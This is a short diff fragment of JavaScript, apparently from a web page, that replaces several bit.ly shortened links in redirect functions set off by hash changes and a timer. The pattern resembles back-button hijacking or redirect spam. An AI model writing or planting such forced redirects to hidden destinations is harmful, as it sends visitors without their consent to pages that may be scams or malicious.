@@ -4,14 +4,14 @@ window.onhashchange=function(){jp();};
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://bit.ly/4ayYZ9t";
+        location.href="https://bit.ly/3Gnkv7A";
     }
     function goon(){
-        location.href="https://bit.ly/4ayYZ9t";
+        location.href="https://bit.ly/3Gnkv7A";
     }
 function goon(){
-        location.href="https://bit.ly/3VMnbBc";
+        location.href="https://bit.ly/3Gnkv7A";
     }
 function goon(){
-        location.href="https://bit.ly/3VMnbBc";
+        location.href="https://bit.ly/3Gnkv7A";
     }
